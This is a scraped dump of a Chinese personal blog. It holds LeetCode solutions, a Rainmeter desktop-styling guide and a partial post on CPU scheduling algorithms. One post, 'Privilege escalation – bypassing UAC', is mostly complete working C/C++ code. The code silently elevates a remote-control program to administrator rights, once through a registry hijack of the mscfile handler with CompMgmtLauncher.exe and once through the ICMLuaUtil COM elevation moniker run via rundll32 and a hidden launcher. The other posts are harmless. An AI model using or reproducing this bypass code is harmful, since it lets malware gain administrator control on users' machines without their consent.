K之后，其后更大的下标y_bigger就不必再考虑x了。这很合乎直觉，因为我们要求的是最小的y - x。  我们的下标从前往后走的时候，当前下标既是x，也是y。更确切地说，设当前下标为i，它向前需要看能否满足prefix_sum[i] - prefix_sum[x] \u0026gt;= K；向后需要考虑自己作为区间起点的情况，也就是作为一个x，淘汰掉队列中现有的满足性质一的那些元素。\n上面的代码已经成功利用了性质一，现在只需要再从队首去找满足性质二的元素即可：\nfor (i = 1; i \u0026lt;= A.size(); ++i) { /* 性质一、当前下标作为区间起点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* 性质二、当前下标作为区间终点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* 当前下标放入队列中，作为区间起点 */ monoq.push_back(i); }  AC代码：\nclass Solution { public: int shortestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int prefix_sum[50010]; // 前缀和数组  deque\u0026lt;int\u0026gt; monoq; // 单调队列  int i; // 循环变量  int ans = A.size() + 1; // 最终答案，初始值大于数组长度，是个违法数值  /* 循环一遍求得前缀和 */ prefix_sum[0] = 0; // !IMPORTANT  for (i = 1; i \u0026lt;= A.size(); ++i) // prefix_sum[i]为A[0]到A[i - 1]的前缀和  { prefix_sum[i] = prefix_sum[i - 1] + A[i - 1]; } /* 再循环一遍求得最短子数组的长度 */ monoq.push_back(0); // 放入一个0  for (i = 1; i \u0026lt;= A.size(); ++i) { /* 性质一、当前下标作为区间起点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); } /* 性质二、当前下标作为区间终点的情况 */ while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[i] - prefix_sum[monoq.front()] \u0026gt;= K) { ans = min(ans, i - monoq.front()); monoq.pop_front(); } /* 当前下标放入队列中，作为区间起点 */ monoq.push_back(i); } return ans == A.size() + 1 ? -1 : ans; } }; 一些细节\n 在之前的分析中我们提到过，在这个题目中，prefix_sum[i]表示的是从A[0]到A[i - 1]的前缀和。这里的前缀和数组的表示方法主要是为了满足区间长度为A.size()时的情况。我们的monoq需要有个初始元素0，这使得prefix_sum[0]也受到考虑。当答案区间长度为A.size()的时候，如样例3：\n输入：A = [2,-1,2], K = 3 输出：3 如果没有一个prefix_sum[monoq.front()] == 0，前缀和prefix_sum[3]会直接减掉prefix_sum[1]，造成输出为-1。\n 参考文章\n[1] 王琛.Leetcode 862 Shortest Subarray with Sum at Least K[EB/OL].2018-07-02\nhttps://buptwc.github.io/2018/07/02/Leetcode-862-Shortest-Subarray-with-Sum-at-Least-K/\n[2] LeetCode.和至少为 K 的最短子数组[EB/OL].2019-08-13\nhttps://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/solution/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu-by-leetcod/\n","date":"2021-01-13T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode862.-%E5%92%8C%E8%87%B3%E5%B0%91%E4%B8%BA-k-%E7%9A%84%E6%9C%80%E7%9F%AD%E5%AD%90%E6%95%B0%E7%BB%84/","title":"难题本 | LeetCode862. 和至少为 K 的最短子数组"},{"content":"题目链接：https://leetcode-cn.com/problems/verifying-an-alien-dictionary/\n题目分析：由题目给定字符的大小等级，依照此等级比较字符串大小。\n解题思路：定义一个数组order_rank[26]，给定某个字符c, order_rank['a' - c]表示该字符在order中的位置。\n错误记录：程序第32行，原本写作：while (words1[idx] == words2[idx])，这样的写法无法满足两个字符串相等的情况（即两个字符串每个字符都相等，包括最后的\\0符号也相等，产生了溢出，理论上循环将在字符串后的某个位置上停止。\n更正：循环中判断两个字符的终止，改为while (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != '\\0' \u0026amp;\u0026amp; words2[idx] != '\\0')。\nAC代码：\nclass Solution { public: int order_rank[26]; bool isAlienSorted(vector\u0026lt;string\u0026gt;\u0026amp; words, string order) { vector\u0026lt;string\u0026gt;::iterator ite; bool ret = true; set_rank(order); // 设置order_rank数组  for (ite = words.begin(); ite != words.end(); ++ite) // 两两对比  { if (ite != words.end() - 1) { if (cmp(*ite, *(ite + 1)) \u0026gt; 0) // cmp返回正数，前者比后者大  { ret = false; break; } } } return ret; } void set_rank(string order) { int idx = 0; for (idx = 0; idx \u0026lt; 26; ++idx) { order_rank[order[idx] - \u0026#39;a\u0026#39;] = idx; // 得到每个字母的顺序，rank越小，出现越早，等级越低  } } int cmp(string words1, string words2) { int idx = 0; while (words1[idx] == words2[idx] \u0026amp;\u0026amp; words1[idx] != \u0026#39;\\0\u0026#39; \u0026amp;\u0026amp; words2[idx] != \u0026#39;\\0\u0026#39;) { ++idx; } // 循环结束，word1[idx] != words2[idx]  // 分三种情况  if (words1[idx] == \u0026#39;\\0\u0026#39;) // words1到达末尾  { if (words2[idx] == \u0026#39;\\0\u0026#39;) return 0; else return -1; // word1 \u0026lt; words2  } else if (words2[idx] == \u0026#39;\\0\u0026#39;) // words2 到达末尾  { return 1; // word1 \u0026gt; words2  } else // 出现不相等，比较两者字符的rank，越低的越小  return order_rank[words1[idx] - \u0026#39;a\u0026#39;] - order_rank[words2[idx] - \u0026#39;a\u0026#39;]; // words1[idx]的rank更小，返回负数  } }; ","date":"2021-01-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode953.-%E9%AA%8C%E8%AF%81%E5%A4%96%E6%98%9F%E8%AF%AD%E8%AF%8D%E5%85%B8/","title":"错题本 | LeetCode953. 验证外星语词典"},{"content":"最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。\n话不多说，总结本次的提权办法——绕过UAC。\n1 UAC  UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。\n然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。\n当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。\n如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。\n不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。\n 2 绕过UAC  根据参考文章［１］所述，\t触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：\n 该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。  对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。\n 2.1 基于白名单的Bypass　UAC  有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。\n针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。\n我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：\n#include \u0026lt;Windows.h\u0026gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项  ::RegCreateKeyEx(HKEY_CURRENT_USER, \u0026#34;Software\\\\Classes\\\\mscfile\\\\Shell\\\\Open\\\\Command\u0026#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, \u0026amp;hKey, NULL); // 设置键值  ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // 关闭注册表  ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位  ::Wow64DisableWow64FsRedirection(\u0026amp;OldValue); // 修改注册表，设置我们的程序为启动目标  bRet = SetReg(\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); // 运行 CompMgmtLauncher.exe  system(\u0026#34;CompMgmtLauncher.exe\u0026#34;); printf(\u0026#34;Run OK!\\n\u0026#34;); // 恢复文件重定位  ::Wow64RevertWow64FsRedirection(OldValue); return 0; } 然而，修改注册表的提权方式过于简陋，会被WinDefender拦截下来。\n\r被识别的行为\r\n运行的结果也就不放了。程序会直接被杀死（Defender甚至把我的目标exe给删了）。\n  2.2 基于COM组件接口的Bypass　UAC  我对于COM的理解实际上不够清晰和深入，有兴趣的可以去看看参考文章[1~3]。\n从我的理解来看，COM（Component Object Model，组件对象模型）是一种更加严格的面向对象编程规范，遵守这一规范的二进制程序需要提供标准的接口来供其他程序调用。这种程序以“组件”的方式存在，可以被复用，故节省了内存；而且，由于这些组件独立存在，对它们本身做出的改动不会影响使用者的程序结构，方便了它们的功能升级。\nCOM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序，以提升权限的方法来激活COM类，最终提升COM接口权限。简单地说，就是主调程序以COM的规范实例化一个具有管理员权限的组件，这样这个组件的功能函数就能运行在管理员权限下。此外，COM规定了一个ICMLuaUtil接口，其下有一个ShellExcute方法，能够启动任意的程序。\n文章[1]还指出，如果执行COM提升名称代码的程序身份是不可信的，则会触发UAC弹窗；若可信，则不会触发UAC弹窗。所以，要想Bypass UAC，则需要想办法让这段代码在Windows的可信程序中运行。其中，可信程序有计算器、记事本、资源管理器、rundll32.exe等。\n我们仅仅希望以管理员权限启动我们的远控程序，则直接制作一个DLL交给rundll32.exe运行即可。按照上面的思路，我们的DLL应该先实例化一个管理员权限的COM组件，这个提权后的组件调用ShellExcute来启动远控程序。\nDLL项目的代码如下：\n// File: CBypassUAC.h #pragma once #ifndef BYPASS_UAC_H #define BYPASS_UAC_H  #include \u0026#34;windows.h\u0026#34;#include \u0026lt;objbase.h\u0026gt;#include \u0026lt;strsafe.h\u0026gt; #define CLSID_CMSTPLUA L\u0026#34;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\u0026#34; #define IID_ICMLuaUtil L\u0026#34;{6EDD6D74-C007-4E75-B76A-E5740995E24C}\u0026#34;  typedef interface ICMLuaUtil ICMLuaUtil; typedef struct ICMLuaUtilVtbl { BEGIN_INTERFACE HRESULT(STDMETHODCALLTYPE* QueryInterface)( __RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_ void** ppvObject); ULONG(STDMETHODCALLTYPE* AddRef)( __RPC__in ICMLuaUtil* This); ULONG(STDMETHODCALLTYPE* Release)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method1)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method2)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method3)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method4)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method5)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method6)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* ShellExec)( __RPC__in ICMLuaUtil* This, _In_ LPCWSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow ); HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)( __RPC__in ICMLuaUtil* This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey, _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString ); HRESULT(STDMETHODCALLTYPE* Method9)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method10)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method11)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method12)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method13)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method14)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method15)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method16)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method17)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method18)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method19)( __RPC__in ICMLuaUtil* This); HRESULT(STDMETHODCALLTYPE* Method20)( __RPC__in ICMLuaUtil* This); END_INTERFACE } *PICMLuaUtilVtbl; interface ICMLuaUtil { CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; }; extern \u0026#34;C\u0026#34; __declspec(dllexport) void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow); HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid); BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable); #endif  // File: CBypassUAC.c #include \u0026#34;pch.h\u0026#34;#include \u0026#34;CBypassUAC.h\u0026#34; // COM提升名称，以管理员权限实例化一个组件 HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid) { BIND_OPTS3 bo; WCHAR wszCLSID[MAX_PATH] = { 0 }; WCHAR wszMonikerName[MAX_PATH] = { 0 }; HRESULT hr = 0; // 初始化COM环境 ::CoInitialize(NULL); // 构造字符串 ::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0]))); hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L\u0026#34;Elevation:Administrator!new:%s\u0026#34;, wszCLSID); if (FAILED(hr)) { return hr; } // 设置BIND_OPTS3 ::RtlZeroMemory(\u0026amp;bo, sizeof(bo)); bo.cbStruct = sizeof(bo); bo.hwnd = hWnd; bo.dwClassContext = CLSCTX_LOCAL_SERVER; // 创建名称对象并获取COM对象 hr = ::CoGetObject(wszMonikerName, \u0026amp;bo, riid, ppVoid); return hr; } BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable) { HRESULT hr = 0; CLSID clsidICMLuaUtil = { 0 }; IID iidICMLuaUtil = { 0 }; ICMLuaUtil* CMLuaUtil = NULL; BOOL bRet = FALSE; do { ::CLSIDFromString(CLSID_CMSTPLUA, \u0026amp;clsidICMLuaUtil); ::IIDFromString(IID_ICMLuaUtil, \u0026amp;iidICMLuaUtil); // 提权  hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(\u0026amp;CMLuaUtil)); if (FAILED(hr)) { break; } // 启动程序  hr = CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW); if (FAILED(hr)) { break; } bRet = TRUE; } while (FALSE); // 释放 if (CMLuaUtil) { CMLuaUtil-\u0026gt;lpVtbl-\u0026gt;Release(CMLuaUtil); } return bRet; } void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow) { CMLuaUtilBypassUAC((LPWSTR)L\u0026#34;F:\\\\RemoteCtrl_Win10.exe\u0026#34;); } 这里需要注意，我们要在头文件中将目标函数BypassUAC导出，否则rundll32.exe程序无法正确获取这个函数。具体方法就是在函数声明时加上extern \u0026quot;C\u0026quot; __declspec(dllexport)前缀。\n对于DLL项目中的dllmain.cpp文件，保持默认即可。编译此程序，生成一个DLL。现在我们还需要编写一个程序用来调用rundll32.exe，使其执行链接库中的BypassUAC函数。\n新建一个Launcher项目，只有一个源文件：\n// File: Launcher.cpp #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;iostream\u0026gt; using namespace std; int main() { //调用rundll32.exe去执行RemoteThreadDll.dll的导出函数 达到BypassUAC char szCmdLine[MAX_PATH] = { 0 }; char szRundll32Path[MAX_PATH] = \u0026#34;C:\\\\Windows\\\\System32\\\\rundll32.exe\u0026#34;; //获取当前程序所在路径 char pszFileName[MAX_PATH] = { 0 }; GetModuleFileNameA(NULL, pszFileName, MAX_PATH); //获取当前程序所在目录 (strrchr(pszFileName, \u0026#39;\\\\\u0026#39;))[0] = 0; //拼接要注入dll路径 char pszDllName[MAX_PATH] = { 0 }; sprintf_s(pszDllName, \u0026#34;%s\\\\%s\u0026#34;, pszFileName, \u0026#34;BypassUAC.dll\u0026#34;); sprintf_s(szCmdLine, \u0026#34;%s %s %s\u0026#34;, szRundll32Path, pszDllName, \u0026#34;BypassUAC\u0026#34;); WinExec(szCmdLine, SW_HIDE); } 运行此Launcher，将以管理员权限打开我们的远控程序。\n\r管理员权限执行用户添加\r\n而没有提权时我们的程序无法执行这个指令。\n\r正常权限下被拒绝访问\r\n  参考文章 [1] 酷扯儿.Windows编程技术：提权技术(下)[EB/OL].2020-09-22\nhttps://baijiahao.baidu.com/s?id=1678518589760092233\u0026amp;wfr=spider\u0026amp;for=pc\n[2] FDCFDMin.COM（Componet Object Model_组件对象模型）技术概述[EB/OL].2018-09-17\nhttps://blog.csdn.net/weixin_39743893/article/details/82500563\n[3] Microsoft.COM Technical Overview[EB/OL].2018-05-31\nhttps://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview\n[4] 自己的小白.基于COM组件接口ICMLuaUtil的Bypass UAC[EB/OL].2020-04-24\nhttps://www.cnblogs.com/ndyxb/p/12770289.html\n本文中使用的远控程序 https://github.com/SGS4ever/RemoteCtrl\n","date":"2020-12-28T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/","title":"提权技术--绕过UAC"},{"content":"谁能想到我在考试前一天还在写桌面美化的博客呢？\n电脑桌面是每天开机后进入工作之前第一眼看到的东西，一个美观的桌面能从心情上给人以振奋。我在整机重装之后学习了一下如何美化桌面，现在我的Window10系统桌面长成这样：\n\r桌面效果\r\n1. rainmeter  rainmeter实际上是一个系统状态监视软件，由于其强大的可定制性及扩展性，诸多使用者在原来的基础上开发了成百上千的插件程序和皮肤样式，使得现在的rainmeter几乎成为一款完美的系统美化工具。你可以从官网上下载它：\n Rainmeter, desktop customization tool\n 下载安装完成之后，打开这个程序，自带一个简单的样式，使得你可以在桌面上看到CPU使用率、磁盘使用情况等等。\n要达到美化的效果，仅仅使用自带的组件样式是不够的。我们需要从网络上寻找好看的rainmeter皮肤资源，这里首先给出官方的社区，本次桌面的效果就是使用社区中michaelpuerses大佬做的Sonder皮肤：\n Sonder - Rainmeter skin by michaelpurses on DeviantArt\n 需要注意的是，访问此网站需要科学上网，且最好选择漂亮国的节点，并开启全局模式。如果你不会，我也不打算教你，你可以从很多其他地方找到皮肤资源（如GitHub、国内各论坛等等）。此外，下载皮肤时要求进行注册，亲测gamil有效。\nrainmeter的皮肤有两种形式：\n .rmskin文件格式。这类文件直接双击打开，自动安装皮肤。 文件夹格式。这类皮肤需要手动放入你的rainmeter皮肤路径下，具体做法为：右键右下角的rainmeter小图标 \u0026ndash;\u0026gt; 皮肤 \u0026ndash;\u0026gt; 打开皮肤目录，将你下好（并解压）的文件夹放进去。  我在寻找皮肤的过程中，发现国内网站的相关内容真是少的可怜，找到一个论坛，下载皮肤的时候居然还要交钱买邀请码进行登录，属实有点离谱；百度rainmeter贴吧上面有些大佬的作品看着还可以，我没有试用过。\n你还可以从知乎或者一些外文评测贴中找到很多好看的主题推荐，这里给出两个外文帖子，我的主题就是在第二篇文章的推荐下找到的：\n 43 Best Rainmeter Skins For Windows in 2020\n35 Spectacular Rainmeter Skins For Windows\n 放张效果图吧，除了我现在使用的桌面外，rainmeter还能这样玩：\n\rEnigma主题效果图\r\n看完是不是很想开启自己的皮肤邂逅之旅了？\n 2. TaskbarX  实际上，我的桌面还有处地方值得注意：任务栏图标居中。看似细小处，实则是整个和谐的视觉体系中不可或缺的一部分。在很多Windows的美化教程中，都使用各式各样的软件来制作出类似MacOS的dock效果，而且实际上rainmeter也能制作dock效果，不过michaelpuerses大佬没有在我这款皮肤中实现dock。\n就我个人而言，完全仿照MacOS进行美化实在是有点过头了。很多好看的主题，只需要将任务栏透明化、图标居中之后就会产生画龙点睛的效果。\n于是引出我们要下载的第二款软件：TaskbarX。这款软件能使你的任务栏图标始终保持居中状态，其原理大概是每隔固定的时间进行检查与调整（我猜的）。链接如下：\n TaskbarX | Center taskbar icons (chrisandriessen.nl)\n 我下载的是Zip包，因为微软商店的UWP版本要交钱，我没有钱。\n安装完成之后，你可以在安装路径中找到TaskbarX.exe和TaskbarX Configurator.exe，运行前者，实现对任务栏进行修改；运行后者，对任务栏样式进行设置。\n运行后者弹出一个设置界面，Style一栏控制任务栏背景样式，在我们的主题中，将其设置为透明且有些许模糊的效果：\n\r任务栏style\r\n第二栏的Animation设置任务栏图标数量发生变化之后的动画效果，随自己喜好去设置即可。\n 3. 一些细节  如果你要使用我的主题，你可能还需要注意到一个方面：我的桌面是没有图标的。\n\r桌面效果\r\n这种蛋疼的做法实际上使得你的桌面除了美观，没有其他的优点，毕竟你无法使用快捷方式了。\n但是我已经习惯从资源管理器里面找程序或文件了，所以可以接受这种布局；实在特别常用的程序，固定到任务栏即可。\n实际上，有些rainmeter主题能够在桌面上制造一个抽屉类的组件，可以将快捷方式放在里面，鼠标移上去的时候展开，鼠标移开的时候关闭，效果极好，配合此主题使用极佳，这也是本主题将来可以进行改善的一点。\n有些人的电脑桌面除了快捷键之外还有回收站、此电脑等图标，这些图标可以按照以下步骤关闭：\nWin + i打开设置面板 \u0026ndash;\u0026gt; 个性化 \u0026ndash;\u0026gt; 主题 \u0026ndash;\u0026gt; 桌面图标设置 \u0026ndash;\u0026gt; 将不用的图标消勾即可\n 本文用到的主题（侵权请联系删除）\nSonder-By-michaelpuerses\nWallPaper-Image\n参考资料\n[1] rainmeter.知乎[EB/OL].rainmeter - 知乎 (zhihu.com)\n","date":"2020-12-21T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/","title":"桌面美化方案-Rainmeter"},{"content":"上一次挖的OAuth2.0坑还没填好，又要开一个操作系统的坑了\u0026hellip;\n本篇介绍一些简单的进程调度算法，以及它们的代码实现。文章的具体组织为：一些关键概念的介绍 \u0026ndash;\u0026gt; 四种进程调度算法（SJF、FCFS、HRRF、HPF）。\n话不多说，Let\u0026rsquo;s go！\n一些概念  在对四种调度算法进行介绍之前，有一些概念希望读者能够理解：\n 周转时间：进程完成时间 - 进程到达时间。也就是整个进程从开始到结束所花费的时间。 平均周转时间：这个数值一般用于衡量调度的效率。比如在一段时间内来了5个进程，那么在这段时间内这些进程的平均周转时间就是五个进程的周转时间之和 / 5。 带权周转时间：某个进程的带权周转时间就是这个进程的周转时间 / 运行时间。由于系统中总有多个进程在运行，周转时间往往大于运行时间。因此，带权周转时间一般大于等于1。 平均带权周转时间：多个进程带权周转时间的平均值。  实际上，还有很多指标可以来衡量调度算法的优劣，如CPU利用率、系统吞吐量、响应时间等等。但是本文中介绍的调度算法与时间紧密相连，故此只需要理解以上几个概念，就能够看懂下文对于调度算法的分析。\n 先来先服务算法（First Come First Serve，FCFS）  先来先服务算法简直是不怎么需要介绍的了。顾名思义，该算法使得CPU优先服务最先到达的进程。生活中充满着先来先服务算法：超市排队、食堂取餐等等。下面用一个例子来模拟这个算法：\n假设有五个进程，它们的到达时间和希望的运行时间如下：\n\r进程描述\r\n本着先来先服务的原则，我们在第0秒的时间为进程1服务；在第4秒的时间服务结束，此时进程2、3、5都已到达，但是进程5是最先到的，因而进程5优先受到服务；在第6秒的时间进程5服务结束，此时在等候的进程还有进程2和进程3，为进程3服务，在第16秒的时间服务结束，此时还有进程2和进程4（在第7秒的时候到的），为进程2服务，在第22秒的时候结束进程2，服务进程4，最终在第34秒结束进程4。\nCPU对这五个进程的服务次序如下图所示：\n\r服务次序\r\n如果你还记得第一小节所讲的内容，我们不妨算一下在这个例子中这几个概念分别是多少：\n\r统计时间\r\n你看出其中存在的问题了吗？\n 短作业优先算法（Shortest Job First，SJF）  先来先服务算法很好理解、在生活中很常见，但是它存在一个问题：对于一些运行时间很短的进程，光是在那边排队等待所花费的时间可能数倍于真正的运行时间！\n在上一个例子中，进程2所花费的运行时间只有6秒，但是它很不幸地被进程3抢占先机，只能眼睁睁看着进程3运行了10秒。光是等待的时间就比运行的时间还多！因此，它的带权周转时间也是最大的，现在是否对这个概念的理解深刻了许多？\n先来先服务的死板特性对于某些短作业来说简直是灾难，此时，短作业优先算法就显得友好许多。\n短作业优先算法不关注进程的到达时间，当CPU结束了一个进程的服务之后，永远从等待的所有进程中找出运行时间最短的进程为其服务。\n还是上面的例子，在第0秒的时间为进程1服务，在第4秒的时间进程2、3、5都已到达，此时进程5需要的时间最少，因此它优先受到服务；在第6秒的时间进程5的服务结束了，此时在等候的进程还有2和3，虽然进程3是先到的，但是进程2所需要的时间更少，因此进程2优先受到服务；在第12秒的时候进程2的服务结束了，此时在等候的进程还有3和4，优先为进程3服务，在第22秒的时候为进程4服务，在第34秒的时候结束。\n这个例子中，我们的进程2比进程3更晚到达，但是由于它所需要的时间更短，就得到了优先的服务。这就是短作业优先的思想。\n如果你没有第一时间看出这个算法的问题，那么请考虑下面这个例子：\n\r新例子\r\n在这里，我们只是把进程4的运行时间由12秒调整为8秒，其他的没有变化。\n但是此时，我们在第12秒的时候结束了进程2的服务，此时在等候的还有进程3和进程4，我们优先服务进程4，在第20秒的时候结束它，服务进程3，在第30秒的时候进程3结束。\n把数据完善一下，就会发现问题所在：\n\r新数据\r\n可怜的进程3，在第2秒到达，在第30秒结束，周转时间高达28秒！\n这就是短作业优先的问题——当系统中不断地有短作业到来的时候，很早就在那里等待的长作业就无法得到服务，最终出现进程饥饿。\n 最高响应比优先算法（Highest Response Ratio First，HRRF）  在短作业优先算法中，进程饥饿是一个比较致命的问题。但是短作业优先的思想确实是有相当的可取之处的，于是人们考虑保留这种思想，同时使得长进程能够较少地受到饥饿，这就有了最高响应比优先算法。\n首先，什么是响应比：一个进程的响应比由以下这个公式得到——\nRR = (BT + WT) / BT = 1 + WT / BT\n其中，BT（Burst Time）表示运行时间，WT （Wait Time）表示等待时间。对于一个进程来说，（运行时间+等待时间）除以（运行时间）就是它的响应比。\n不难看出，一个进程的运行时间是不变的，而等待时间每时每刻都在变化，因此一个进程的响应比是每时每刻都在变化的。\n对于RR = 1 + WT / BT，显然每个进程的初始响应比都是1，因为刚刚到达的时候没有等待时间；随着等待时间的变长，进程的响应比不断地变大，它受到调度进入CPU的概率也就变大了。\nHRRF算法还有一个优点：它保留了短作业优先的原则。也就是说，对于同时到达的任务，虽然大家的响应比都是1，但是短作业优先，而长作业需要随着等待时间的增加慢慢地提高自己的响应比，最终接受调度。\n还是考虑第三小节的例子：\n\r新例子\r\n在第0秒的时间，进程1到达，在第4秒的时间结束服务，此时进程2/3/5已经到达，计算它们的响应比：\n\r第四秒响应比\r\n可见，此时进程5已经等待很久了，需要让它接受服务。\n进程5运行2秒，在第6秒的时间结束，此时还有进程2/3在等待，计算它们的响应比：\n\r第六秒响应比\r\n可见，进程2的响应比还是高一些，让它接受服务。\n在第12秒的时候进程2结束，此时进程3和进程4在等待，计算它们的响应比：\n\r第十二秒响应比\r\n此时让进程3接受服务，在第22秒的时候结束，进程4进入，在第30秒的时候结束。\n老规矩，计算数值：\n\r新数据\r\n相比于SJF算法，这个算法使得长进程3免于饥饿，是一个比较暖心的做法。\n这个算法唯一的问题，就是我们需要每时每刻地计算各个进程的响应比，同时需要把它们的响应比存入内存的某个空间中；增加了计算，增加了开销。\n 最高优先数优先（Highest Priority First，HPF）  